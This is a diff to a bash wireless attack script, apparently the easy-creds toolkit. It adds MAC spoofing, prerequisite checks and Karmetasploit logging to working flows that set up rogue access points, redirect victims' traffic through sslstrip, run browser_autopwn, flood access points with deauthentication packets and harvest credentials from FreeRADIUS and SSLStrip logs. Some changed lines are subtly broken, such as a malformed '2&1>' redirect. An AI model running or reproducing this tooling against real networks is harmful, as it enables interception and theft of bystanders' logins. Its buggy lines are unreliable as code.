@@ -64,12 +64,29 @@ if [ -z ${isxrunning} ]; then
 fi
 }
 ##################################################
+f_prereq_check(){
+#This function will check for the necessary prereqs, all MUST be in $PATH to run properly
+app_prereqs="screen radiusd hamster ferret sslstrip dsniff urlsnarf msfconsole airbase-ng airodump-ng hostapd mdk3 ipcalc asleap"
+for apps in ${app_prereqs}; do
+	if [ -z "$(find /usr/bin| grep ${apps})" ] && [ -z "$(find /usr/local/sbin/|grep ${apps})" ] && [ -z "$(find /usr/sbin/|grep ${apps})" ]; then
+		echo -e "\e[1;31m[!]\e[0m Couldn't find ${apps}. If its installed please create a symbolic link in /usr/bin"
+		prereq_error=1
+	fi
+done
+
+if [ ! -z ${prereq_error} ]; then
+		echo -e "\n\e[1;31m[!]\e[0m Some prereqs missing, functionality may be impaired. Review README file."
+		sleep 10
+fi
+app_prereqs= #unset the variable
+}
+##################################################
 f_xtermwindows(){
 x="0"					# x offset value
 y="0"					# y offset value
 width="100"				# width value
 height="7"				# height value
-yoffset="120"				# y offset
+yoffset="120"			# y offset
 }
 ##################################################
 f_checkexit(){
@@ -95,6 +112,8 @@ if [ ! -z "$(pidof ettercap)" ]; then kill $(pidof ettercap); fi
 if [ ! -z "$(pidof urlsnarf)" ]; then kill $(pidof urlsnarf); fi
 if [ ! -z "$(pidof dsniff)" ]; then kill $(pidof dsniff); fi
 echo "0" > /proc/sys/net/ipv4/ip_forward
+
+if [ -z "$(ls ${logfldr})" ];then rm -rf ${logfldr}; fi
 # The following will run for wireless AP attacks
 if [ ! -z ${wireless} ]; then
 	kill $(pidof airbase-ng)
@@ -109,7 +128,7 @@ if [ ! -z ${wireless} ]; then
 fi
 # The following will run for wireless AP DoS attacks
 if [ ! -z ${dosattack} ] ; then
-	if [ -s /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
+	if [ -s /tmp/ec/dosap.pid ]; then kill $(cat /tmp/ec/dosap.pid); fi
 	airmon-ng stop ${dosmon} &> /dev/null
 	airmon-ng stop ${airomon} &> /dev/null
 fi
@@ -123,7 +142,7 @@ fi
 if [ ! -z ${fra} ]; then
 	kill $(pidof radiusd) &> /dev/null
 	kill $(pidof hostapd) &> /dev/null
-	kill $(cat /tmp/ec/tshark.pid) &> /dev/null
+	if [ -s /tmp/ec/tshark.pid ]; then kill $(cat /tmp/ec/tshark.pid);fi
 	echo "" > ${freeradiuslog}
 fi
 # Final portion to clean up and quit current attack or exit
@@ -295,7 +314,7 @@ f_getvics(){
 	GW=
 	p=$(route | grep default | awk '{print $2}')
 	while [ -z ${GW} ]; do
-	 read -p "IP address of the gateway [$p] : " GW
+	 read -p "IP address of the gateway [${p}] : " GW
 	 if [ -z ${GW} ];then GW=${p}; fi
 	done
 	f_whichettercap
@@ -524,6 +543,10 @@ echo -e "\n\e[1;34m[*]\e[0m Your interface has now been placed in Monitor Mode\n
 airmon-ng | grep mon | sed '$a\\n'
 unset MONMODE
 while [ -z "${MONMODE}" ]; do read -p "Enter your monitor enabled interface name, (ex: mon0): " MONMODE; done
+
+if [ ! -z "$(find /usr/bin/ | grep macchanger)" ] || [ ! -z "$(find /usr/local/bin | grep macchanger)" ]; then
+	f_macchanger
+fi
 unset TUNIFACE
 while [ -z "${TUNIFACE}" ]; do read -p "Enter your tunnel interface, example at0: " TUNIFACE; done
 read -p "Do you have a dhcpd.conf file to use? [y/N]: " DHCPFILE
@@ -535,6 +558,36 @@ else
 fi
 
 f_dhcptunnel
+}
+##################################################
+f_macchanger(){
+unset macvar
+read -p "Would you like to change your MAC address on the mon interface? [y/N]: " macvar
+mac_answer=$(echo ${macvar} | tr '[:upper:]' '[:lower:]')
+
+unset random_mac
+unset ap_mac
+if [ "${mac_answer}" == "y" ]; then
+	while [ -z "${random_mac}" ]; do read -p "Would like to have a random MAC address generated or manually input? [r/m]: " random_mac; done
+	case ${random_mac} in
+		r|R) ifconfig ${MONMODE} down && macchanger -A ${MONMODE} && ifconfig ${MONMODE} up;;
+		m|M) while [ -z "${ap_mac}" ];do read -p "Desired MAC address for ${MONMODE}?: " ap_mac;done ; f_mac_manual ;;
+		*) unset random_mac
+	esac
+		sleep 2
+fi
+}
+##################################################
+f_mac_manual(){
+
+if [ -z $(echo ${ap_mac} | sed -n "/^\([0-9A-Z][0-9A-Z]:\)\{5\}[0-9A-Z][0-9A-Z]$/p") ]; then
+	echo -e "\n\e[1;31m[-]\e[0m Invalid MAC address format"
+	sleep 2
+	f_macchanger
+else
+	ifconfig ${MONMODE} down && macchanger -m ${ap_mac} ${MONMODE} && ifconfig ${MONMODE} up
+fi
+
 }
 ##################################################
 f_dhcpconf(){
@@ -589,7 +642,7 @@ f_ipcalc(){
 	ATLENDTMP=$(cat /tmp/ec/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
 	ATLEND=$(echo ${ATLENDTMP}.200)
 
-	echo -e "\n\n\e[1;34m[*]\e[0m Creating a dhcpd.conf to assign addresses to clients that connect to us."
+	echo -e "\n\e[1;34m[*]\e[0m Creating a dhcpd.conf to assign addresses to clients that connect to us."
 
 	cat <<-EOF > ${DHCPPATH}
 		ddns-update-style none;
@@ -620,7 +673,7 @@ f_ipcalc
 f_dhcptunnel(){
 	etterlaunch=7
 	# airbase-ng is going to create our fake AP with the SSID we specified
-	echo -e "\n\e[1;34m[*]\e[0m Launching Airbase with your settings."
+	echo -e "\e[1;34m[*]\e[0m Launching Airbase with your settings."
 
 	if [ "${eviltwin}" == "1" ] && [ -z ${isxrunning} ]; then
 	  screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e "${ESSID}" -v ${MONMODE}
@@ -633,14 +686,14 @@ f_dhcptunnel(){
 	fi
 	sleep 7
 
-	echo -e "\n\e[1;34m[*]\e[0m Configuring tunneled interface."
+	echo -e "\e[1;34m[*]\e[0m Configuring tunneled interface."
 	ifconfig "${TUNIFACE}" up
 	ifconfig "${TUNIFACE}" "${ATIP}" netmask "${ATSUB}"
 	ifconfig "${TUNIFACE}" mtu 1500
 	route add -net "${ATNET}" netmask "${ATSUB}" gw "${ATIP}" dev "${TUNIFACE}"
 	sleep 2
 
-	echo -e "\n\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
+	echo -e "\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
 	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
@@ -650,7 +703,7 @@ f_dhcptunnel(){
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	sleep 2
 
-	echo -e "\n\e[1;34m[*]\e[0m Launching Tail."
+	echo -e "\e[1;34m[*]\e[0m Launching Tail."
 	if [ -z ${isxrunning} ]; then
 	 screen -S easy-creds -X screen -t DMESG tail -f /var/log/messages
 	else
@@ -661,8 +714,8 @@ f_dhcptunnel(){
 
 	#Get the PID so we can kill it when the user quits the attack
 	ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
-
-	echo -e "\n\e[1;34m[*]\e[0m DHCP server starting on tunneled interface."
+	if [ -z "$(cat /tmp/ec/tail.pid)" ]; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi
+	echo -e "\e[1;34m[*]\e[0m DHCP server starting on tunneled interface."
 	if [ -e /etc/dhcp3/dhcpd.conf ]; then
 		dhcpd3 -q -cf ${DHCPPATH} -pf /var/run/dhcp3-server/dhcpd.pid ${TUNIFACE} &
 	elif [ -e /etc/sysconfig/dhcpd ]; then
@@ -698,6 +751,7 @@ fi
 sleep 2
 #Get the PID so we can kill it when the user quits the attack
 ps ax|grep sslstrip|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/sslstrip.pid
+if [ -z $(cat /tmp/ec/sslstrip.pid) ]; then ps ax|grep sslstrip|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/sslstrip.pid; fi
 #Launch ettercap
 f_ecap
 sleep 3
@@ -787,7 +841,9 @@ f_mdk3aps(){
 			xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
 		fi
 	 #Get the PID so we can kill it when the user quits the attack
-	 ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap-pid
+	 ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
+	 #Sometimes it's field #1 and sometimes #2 not sure why
+	 if [ -z $(cat /tmp/ec/dosap.pid) ]; then ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/dosap.pid;fi
 	 echo -e "\n\e[1;34m[*]\e[0m Ctrl-c or close the xterm window to stop the AP DoS attack..."
 	else
 	 	f_getbssids
@@ -828,7 +884,7 @@ f_lastman(){
 
 	#Get the PID so we can kill it when the user quits the attack
 	ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
-
+	if [ -z $(cat /tmp/ec/dosap.pid) ]; then ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/dosap.pid;fi
 	f_mainmenu
 }
 ##################################################
@@ -938,6 +994,7 @@ f_ipcalc
 ##################################################
 f_karmasetup(){
 cat <<-EOF > /tmp/ec/karma.rc
+	spool ${logfldr}/karma.${DATE}.txt
 	use auxiliary/server/browser_autopwn
 	setg AUTOPWN_HOST ${ATIP}
 	setg AUTOPWN_PORT 55550
@@ -1001,24 +1058,25 @@ EOF
 }
 ##################################################
 f_karmafinal(){
-echo -e "\n\e[1;34m[*]\e[0m Launching Airbase..."
+echo -e "\e[1;34m[*]\e[0m Launching Airbase..."
 # airbase-ng is going to create our fake AP with the SSID default
 if [ -z ${isxrunning} ]; then
 	screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e default -v ${MONMODE}
 else
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "default" -v ${MONMODE} &
 fi
-echo $! > /tmp/ec/ec-karma.pid
 sleep 7
+ps ax|grep airbase|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-karma.pid
+if [ -z $(cat /tmp/ec/ec-karma.pid) ]; then ps ax|grep airbase|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-karma.pid; fi
 
-echo -e "\n\e[1;34m[*]\e[0m Configuring tunneled interface."
+echo -e "\e[1;34m[*]\e[0m Configuring tunneled interface."
 ifconfig ${TUNIFACE} up
 ifconfig ${TUNIFACE} ${ATIP} netmask ${ATSUB}
 ifconfig ${TUNIFACE} mtu 1500
 route add -net ${ATNET} netmask ${ATSUB} gw ${ATIP} dev ${TUNIFACE}
 sleep 3
 
-echo -e "\n\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
+echo -e "\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
@@ -1030,7 +1088,7 @@ sleep 3
 #Blackhole Routing - Forces clients to go through attacker even if they have cached DNS entries
 iptables -t nat -A PREROUTING -i ${TUNIFACE} -j REDIRECT
 
-echo -e "\n\e[1;34m[*]\e[0m Launching Tail..."
+echo -e "\e[1;34m[*]\e[0m Launching Tail..."
 if [ -z ${isxrunning} ]; then
 	screen -S easy-creds -t DMESG -X screen tail -f /var/log/messages
 else
@@ -1041,8 +1099,8 @@ sleep 3
 
 #Get the PID so we can kill it when the user quits the attack
 ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
-
-echo -e "\n\e[1;34m[*]\e[0m DHCP server starting on tunneled interface.\n"
+if [ -z $(cat /tmp/ec/tail.pid) ]; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi
+echo -e "\e[1;34m[*]\e[0m DHCP server starting on tunneled interface."
 if [ -e /etc/dhcp/dhcpd.conf ]; then
 	service isc-dhcp-server start
 elif [ -e /etc/dhcp3/dhcpd.conf ]; then
@@ -1055,11 +1113,11 @@ fi
 sleep 3
 
 if [ -z ${isxrunning} ]; then
-	echo -e "\n\e[1;34m[*]\e[0m Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\n"
+	echo -e "\e[1;34m[*]\e[0m Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\n"
 	sleep 5
 	screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/ec/karma.rc
 else
-	echo -e "\n\e[1;34m[*]\e[0m Launching Karmetasploit, this may take a little bit...\n"
+	echo -e "\e[1;34m[*]\e[0m Launching Karmetasploit, this may take a little bit..."
 	y=$((${y}+${yoffset}))
 	xterm -geometry "${width}"x${height}-${x}+${y} -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/ec/karma.rc &
 fi
@@ -1067,7 +1125,7 @@ sleep 2
 
 #Get the PID so we can kill it when the user quits the attack
 ps ax|grep msfconsole|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-metasploit.pid
-
+if [ -z $(cat /tmp/ec/ec-metasploit.pid) ]; then ps ax|grep msfconsole|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/ec-metasploit.pid; fi
 #Enable IP forwarding
 echo "1" > /proc/sys/net/ipv4/ip_forward
 
@@ -1095,8 +1153,8 @@ if [ "${atheroscard}" -lt "1" ]; then
 	sleep 5
 fi
 
-mv ${pathtoradiusconf}/radiusd.conf ${pathtoradiusconf}/radiusd.conf.back
-mv ${pathtoradiusconf}/clients.conf ${pathtoradiusconf}/clients.conf.back
+mv ${pathtoradiusconf}/radiusd.conf ${pathtoradiusconf}/radiusd.conf.back 2&1> /dev/null
+mv ${pathtoradiusconf}/clients.conf ${pathtoradiusconf}/clients.conf.back 2&1> /dev/null
 
 if [ -e ${pathtoradiusconf} ]; then
 	cat ${pathtoradiusconf}/radiusd.conf.back | sed -e '/^proxy_request/s/yes/no/' -e 's/\$INCLUDE proxy.conf/#\$INCLUDE proxy.conf/' > ${pathtoradiusconf}/radiusd.conf
@@ -1227,6 +1285,7 @@ sleep 2
 
 #Get the PID so we can kill it when the user quits the attack
 ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
+if [ -z $(cat /tmp/ec/tail.pid) ] ; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi
 
 tshark -i ${radwiface} -w ${logfldr}/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
 echo $! > /tmp/ec/tshark.pid
@@ -1247,7 +1306,7 @@ if [ -d ${logfldr} ]; then
 	fi
 fi
 
-if [ -e /${PWD}/strip-accts.txt ]; then rm /${PWD}/strip-accts.txt; fi
+if [ -e ${PWD}/strip-accts.txt ]; then rm ${PWD}/strip-accts.txt; fi
 
 unset LOGPATH
 while [ -z ${LOGPATH} ] || [ ! -f "${LOGPATH}" ]; do read -e -p "Enter the full path to your SSLStrip log file: " LOGPATH;	done
@@ -1267,7 +1326,7 @@ while [ ${i} -le "${NUMLINES}" ]; do
 	GREPSTR="$(grep -a ${VAL2} "${LOGPATH}" | grep -a ${VAL3} | grep -a ${VAL4})"
 
 	if [ "${GREPSTR}" ]; then
-		echo -n "${VAL1}" "- " >> /${PWD}/strip-accts.txt
+		echo -n "${VAL1}" "- " >> ${PWD}/strip-accts.txt
 		echo "${GREPSTR}" | \
 		sed -e 's/.*'${VAL3}'=/'${VAL3}'=/' -e 's/&/ /' -e 's/&.*//' >> ${PWD}/strip-accts.txt
 	fi
@@ -1299,7 +1358,7 @@ f_dsniff(){
 	 read -e -p "Enter the path for your dsniff Log file: " DSNIFFPATH
 	done
 
-	dsniff -r ${DSNIFFPATH} >> /${PWD}/dsniff-log.txt
+	dsniff -r ${DSNIFFPATH} >> ${PWD}/dsniff-log.txt
 	if [ -z ${isxrunning} ];then
 	 cat ${PWD}/dnsiff-log.txt | less
 	else
@@ -1550,6 +1609,7 @@ else
 	mkdir /tmp/ec
 	f_isxrunning
 	f_xtermwindows
+	f_prereq_check
 	clean=1
 	f_mainmenu
 fi
